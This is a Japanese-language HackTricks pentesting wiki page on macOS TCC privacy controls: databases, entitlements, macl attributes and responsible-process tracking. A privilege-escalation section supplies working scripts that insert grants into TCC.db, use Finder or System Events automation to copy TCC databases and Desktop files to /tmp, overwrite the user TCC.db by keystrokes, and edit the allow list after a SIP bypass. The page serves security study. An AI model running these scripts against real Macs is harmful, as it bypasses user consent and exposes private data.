# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **基本情報**

**TCC (Transparency, Consent, and Control)** は、アプリケーションの権限を規制することに重点を置いたセキュリティプロトコルです。その主な役割は、**位置情報サービス、連絡先、写真、マイク、カメラ、アクセシビリティ、フルディスクアクセス** などの機密性の高い機能を保護することです。これらの要素へのアプリのアクセスを許可する前にユーザーの明示的な同意を必須とすることで、TCC はプライバシーとデータに対するユーザーの管理性を向上させます。

アプリケーションが保護された機能へのアクセスを要求すると、ユーザーは TCC に遭遇します。これは、ユーザーが **アクセスを承認または拒否** できるプロンプトとして表示されます。さらに、TCC は、**ファイルをアプリケーションにドラッグアンドドロップする** といったユーザーによる直接的な操作にも対応しており、特定のファイルへのアクセスを許可できます。これにより、アプリケーションは明示的に許可されたものだけにアクセスできます。

![TCC プロンプトの例](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** は `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` にある **daemon** によって処理され、`/System/Library/LaunchDaemons/com.apple.tccd.system.plist` で設定されています（mach service `com.apple.tccd.system` を登録）。

ログインしているユーザーごとに **user-mode tccd** が実行されており、`/System/Library/LaunchAgents/com.apple.tccd.plist` で定義され、mach service `com.apple.tccd` および `com.apple.usernotifications.delegate.com.apple.tccd` を登録しています。

ここでは、system と user として実行されている tccd を確認できます。
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Permissions は **parent** application から**継承**され、**permissions** は **Bundle ID** と **Developer ID** に基づいて**追跡**されます。

### TCC Databases

allow/deny は、以下の TCC databases に保存されます。

- システム全体の database は **`/Library/Application Support/com.apple.TCC/TCC.db`** です。
- この database は **SIP protected** であるため、書き込むには SIP bypass のみが必要です。
- user TCC database **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** は、ユーザーごとの設定用です。
- この database は保護されているため、Full Disk Access などの高い TCC privileges を持つ process のみが書き込めます（ただし、SIP によって保護されているわけではありません）。

> [!WARNING]
> 上記の databases は、読み取りアクセスも **TCC protected** です。そのため、TCC privileged process からでない限り、通常の user TCC database を**読み取ることはできません**。
>
> ただし、**FDA** や **`kTCCServiceEndpointSecurityClient`** などの高い privileges を持つ process は、ユーザーの TCC database に書き込めることを覚えておいてください。

- **location services にアクセス**できる client を示す、**3 番目**の TCC database が **`/var/db/locationd/clients.plist`** にあります。
- **SIP protected** file **`/Users/carlospolop/Downloads/REG.db`**（TCC による読み取りアクセスからも保護されています）には、すべての**有効な TCC databases** の**場所**が含まれています。
- **SIP protected** file **`/Users/carlospolop/Downloads/MDMOverrides.plist`**（TCC による読み取りアクセスからも保護されています）には、付与された TCC permissions がさらに含まれています。
- **SIP protected** file **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`**（誰でも読み取り可能）には、TCC exception が必要な applications の allow list が含まれています。

> [!TIP]
> **iOS** の TCC database は **`/private/var/mobile/Library/TCC/TCC.db`** にあります。

> [!TIP]
> **notification center UI** は、**system TCC database** に変更を加えることができます。
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> ただし、ユーザーは **`tccutil`** command line utility を使って rules を**削除または query**できます。

#### Query the databases

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> 両方のデータベースを確認すると、アプリが許可した権限、拒否した権限、またはまだ持っていない権限（アプリが要求する）を確認できます。

- **`service`** は TCC **permission** の文字列表現です
- **`client`** は権限を持つ **bundle ID** または **path to binary** です
- **`client_type`** は Bundle Identifier(0) と absolute path(1) のどちらであるかを示します

<details>

<summary>absolute path の場合の実行方法</summary>

**`launctl load you_bin.plist`** を実行するだけです。plist は次のようになります:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** には、denied(0)、unknown(1)、allowed(2)、limited(3) の異なる値を指定できます。
- **`auth_reason`** には、次の値を指定できます: Error(1)、User Consent(2)、User Set(3)、System Set(4)、Service Policy(5)、MDM Policy(6)、Override Policy(7)、Missing usage string(8)、Prompt Timeout(9)、Preflight Unknown(10)、Entitled(11)、App Type Policy(12)
- **csreq** フィールドは、実行する binary を検証し、TCC permissions を付与する方法を示します:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- テーブルの**その他のフィールド**の詳細については、[**このブログ記事を確認してください**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)。<sup>[[1]](#references)</sup>

`System Preferences --> Security & Privacy --> Privacy --> Files and Folders` で、アプリに**すでに付与されている権限**を確認することもできます。

> [!TIP]
> ユーザーは **`tccutil`** を使用して**ルールを削除またはクエリ**できます。

#### TCC permissionsのリセット
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC 署名チェック

TCC **database** はアプリケーションの **Bundle ID** を保存しますが、アプリが使用を要求している **permission** が正しいものであることを **確認する** ために、**signature** に関する **information** も **保存** します。
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> したがって、同じ名前と bundle ID を使用する他のアプリケーションは、他のアプリに付与された権限にアクセスできません。

### Entitlements と TCC Permissions

アプリは、一部のリソースへの**アクセスを要求**して**許可される**だけでなく、**関連する entitlements を持っている必要もあります**。\
たとえば **Telegram** には、**カメラへのアクセス**を要求するための entitlement `com.apple.security.device.camera` があります。この **entitlement を持たない** **アプリ**はカメラにアクセスできません（ユーザーに権限を求めるプロンプトすら表示されません）。

entitlements は plist ファイルであり、code sig の一部です。さらに、特別なスロットによって code sig 内でハッシュ化されており、kernel code によって kernel 内で照会されるか、`csops(#169)` または `csops_audittoken(#170)` を使用する user model code によって照会される場合があります。

ただし、アプリが `~/Desktop`、`~/Downloads`、`~/Documents` などの**特定のユーザーフォルダにアクセス**するために、特定の **entitlements** を持つ必要はありません。システムがアクセスを透過的に処理し、必要に応じて**ユーザーにプロンプトを表示**します。

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Apple のアプリは**プロンプトを生成しません**。これらのアプリは **entitlements** リストに**事前に付与された権限**を含んでいるため、**ポップアップが表示されることはなく**、**TCC データベースにも表示されません**。例：
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
これにより、Calendar がユーザーに reminders、calendar、address book へのアクセスを求めることを防ぎます。

> [!TIP]
> entitlements に関する公式ドキュメント以外にも、[**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) に **entitlements に関する興味深い情報** が掲載されています。

一部の TCC permissions は、kTCCServiceAppleEvents、kTCCServiceCalendar、kTCCServicePhotos などです。すべての permissions を定義した public list はありませんが、[**既知のものの list**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) を確認できます。<sup>[[1]](#references)</sup>

### Sensitive unprotected places

- $HOME (それ自体)
- $HOME/.ssh、$HOME/.aws など
- /tmp

### User Intent / com.apple.macl

前述のとおり、**ファイルを App に drag\&drop することで、その App にファイルへの access を grant** できます。この access は TCC database には指定されず、ファイルの **extended** **attribute** として指定されます。この attribute には、許可された App の **UUID** が保存されます。<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> **`com.apple.macl`**属性がtccdではなく**Sandbox**によって管理されているのは興味深い点です。
>
> また、コンピューター上のアプリのUUIDを許可するファイルを別のコンピューターに移動すると、同じアプリでも異なるUIDを持つため、そのアプリにアクセス権が付与されないことにも注意してください。

拡張属性`com.apple.macl`は、他の拡張属性のように**クリアできません**。これは**SIPによって保護されている**ためです。ただし、[**この投稿で説明されているように**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)、ファイルを**zip化**し、**削除**してから**unzip**することで無効化できます。<sup>[[3]](#references)</sup>






## XNUのResponsible Processメカニズム

macOS/iOSでは、**Responsible Process**メカニズムは、**TCC（Transparency, Consent, and Control）**フレームワークやその他のセキュリティシステムが、子プロセスの連鎖を経由する場合でも、あるアクションに最終的な責任を持つプロセスを追跡するために使用する重要なセキュリティ機能です。

TCCが権限（カメラ、マイク、位置情報など）をチェックする際、リクエストを実行している直接のプロセスを常に確認するとは限りません。代わりに、**Responsible Process**を確認します。これは通常、実際のリクエストがhelper processやdaemonから送信された場合でも、そのアクションを開始したGUIアプリケーションです。

<details>
<summary>Responsible Processの設定方法</summary>

### プロセス構造体のフィールド

XNUの各プロセスは、2つの重要なUUID識別子を保持しています。
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: プロセス自身のUUID（Mach-Oバイナリの`LC_UUID`ロードコマンドから取得）
- **`p_responsible_pid`**: responsible processのPID
- **`p_responsible_uuid`**: responsible processのUUID（そのプロセスが終了した後も保持される）

### Responsible Processの設定方法

1. **プロセス作成時（Fork）**

`fork()`または`posix_spawn()`によって新しいプロセスが作成されると、responsible processは親プロセスから継承されます（`exec()` syscallは既存の`proc`構造体を再利用するため、この処理はそこで再実行されません）。

**Location**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**主なポイント:**
- 子プロセスは親の `p_responsible_pid` を**継承**する
- これにより、プロセス階層全体に**責任チェーン**が形成される
- 責任プロセスは通常、元の GUI アプリケーションを指す

2. **コア関数: `proc_set_responsible_pid()`**

**場所**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**この関数の動作:**
1. **対象プロセスに responsible PID を設定**
2. `proc_find()` を使用して responsible process を検索（参照カウントをインクリメント）
3. responsible process の `p_uuid` から対象プロセスの `p_responsible_uuid` に UUID をコピー
4. `proc_rele()` で参照を解放（参照カウントをデクリメント）

3. **なぜ PID と UUID の両方を保存するのか？**

この二重保存方式は、重要な問題を解決します。

| フィールド | 目的 | 問題 | 解決策 |
|-------|---------|---------|----------|
| `p_responsible_pid` | 現在のプロセスの高速検索 | プロセス終了後、PID が再利用される可能性がある | アクティブなプロセスの検索に使用 |
| `p_responsible_uuid` | 永続的な識別 | プロセス終了後も保持される | セキュリティチェックと監査に使用 |

**問題**: responsible process が child より先に終了した場合、PID が再利用され、まったく別のプロセスに割り当てられる可能性があります。

**解決策**: UUID は不変であり、終了後も responsible だった特定の binary を一意に識別します。

### Process Creation Flow
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### UUID Source: LC_UUID Load Command

`p_uuid` に保存される UUID は、**Mach-O executable の `LC_UUID` load command** に由来します：

1. **Compilation Time**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **実行時間**

**場所**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **プロセス構造体に保存**

**Location**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**場所**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### TCCへの挿入

TCC databaseへのwrite accessを取得できた場合は、以下のような方法でentryを追加できます（commentsを削除してください）：

<details>

<summary>TCCへの挿入の例</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

TCC permissionsを持つアプリ内への侵入に成功した場合は、以下のページでTCC payloadsを確認し、それらをabuseしてください:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Apple Eventsについては、以下を参照してください:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Automation permissionのTCC nameは **`kTCCServiceAppleEvents`** です。\
この特定のTCC permissionは、TCC database内で**管理可能なアプリケーション**も示します（そのため、permissionによってすべてを管理できるわけではありません）。

**Finder**は**常にFDAを持つ**アプリケーションです（UIに表示されない場合でも同様です）。そのため、Finderに対する**Automation** privilegesを持っている場合、そのprivilegesをabuseして、**いくつかのアクションを実行させる**ことができます。\
この場合、アプリには **`com.apple.Finder`** に対する **`kTCCServiceAppleEvents`** permissionが必要です。<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

これを悪用して、**独自のユーザー TCC database を書き込む**ことができます。

> [!WARNING]
> この権限があると、**Finder に TCC restricted folders へのアクセスを要求し、ファイルを渡させる**ことができますが、私の知る限り、**Finder に任意のコードを実行させて FDA access を完全に悪用する**ことはできません。
>
> したがって、FDA の機能を完全に悪用することはできません。

これは Finder に対する Automation privileges を取得するための TCC prompt です。

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> **Automator** app には TCC permission **`kTCCServiceAppleEvents`** があるため、Finder などの **任意の app を control** できます。そのため、Automator を control する permission があれば、以下のような code で **Finder も control** できます。

<details>

<summary>Automator 内で shell を取得する</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

**Script Editor app**でも同じことが起こります。Finderを操作できますが、AppleScriptを使用してスクリプトを強制的に実行させることはできません。

### 一部のTCCへのAutomation (SE)

**System EventsはFolder Actionsを作成でき、Folder Actionsは一部のTCCフォルダ**（Desktop、Documents、Downloads）にアクセスできるため、次のようなスクリプトを使用してこの動作を悪用できます。
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automation (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** による FDA\*

**`System Events`** 上の Automation + Accessibility（**`kTCCServicePostEvent`**）により、**プロセスにキーストロークを送信**できます。これを利用して、Finder を悪用し、ユーザーの TCC.db を変更したり、任意のアプリに FDA を付与したりできます（ただし、この操作ではパスワードの入力を求められる場合があります）。

Finder によるユーザーの TCC.db 上書きの例:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` to FDA\*

このページでは、FDA\*へのprivescや、例えばkeyloggerの実行に利用できる[**Accessibility permissionsをabuseするpayloads**](macos-tcc-payloads.md#accessibility)を確認してください。

### **Endpoint Security Client to FDA**

**`kTCCServiceEndpointSecurityClient`**があれば、FDAを取得できます。以上です。

### System Policy SysAdmin File to FDA

**`kTCCServiceSystemPolicySysAdminFiles`**では、ユーザーの**`NFSHomeDirectory`**属性を**変更**できます。これによりユーザーのhome folderが変更され、結果として**TCCをbypass**できます。<sup>[[5]](#references)</sup>

### User TCC DB to FDA

**user TCC** databaseへの**write permissions**を取得しても、自分に**`FDA`** permissionsを付与することは**できません**。それを付与できるのは、system databaseに存在するものだけです。

ただし、自分に**`Automation rights to Finder`**を付与し、前述のtechniqueをabuseしてFDA\*へescalateできます。

### **FDA to TCC permissions**

**Full Disk Access**のTCC nameは**`kTCCServiceSystemPolicyAllFiles`**です。

これは実際のprivescではないと思いますが、役立つ場合に備えて説明します。FDAを持つprogramをcontrolしている場合、**users TCC databaseをmodifyして、自分に任意のaccessを付与**できます。これは、FDA permissionsを失う可能性がある場合のpersistence techniqueとして利用できます。

### **SIP Bypass to TCC Bypass**

system **TCC database**は**SIP**によって保護されています。そのため、**indicated entitlementsを持つprocessだけがmodify**できます。したがって、attackerが**file**に対する**SIP bypass**（SIPによって制限されたfileをmodifyできる状態）を見つけた場合、以下が可能になります。

- **TCC databaseのprotectionをremove**し、自分にすべてのTCC permissionsを付与する。例えば、以下のfileをabuseできます。
- TCC systems database
- REG.db
- MDMOverrides.plist

ただし、この**SIP bypassをabuseしてTCCをbypass**する別の方法もあります。`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`は、TCC exceptionを必要とするapplicationsのallow listです。したがって、attackerがこのfileから**SIP protectionをremove**し、自分の**application**を追加できれば、そのapplicationはTCCをbypassできるようになります。\
例えば、terminalを追加するには：
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypass


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## 参考資料

- [1] [macOS TCC.dbの詳細 - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.maclを追跡するscript（brunerdによるGist）](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.maclを追跡して対処する](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [偶然と設計によるmacOS TCC User Privacy ProtectionsのBypass](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [home directoryを変更してTCCをBypassする、別名CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
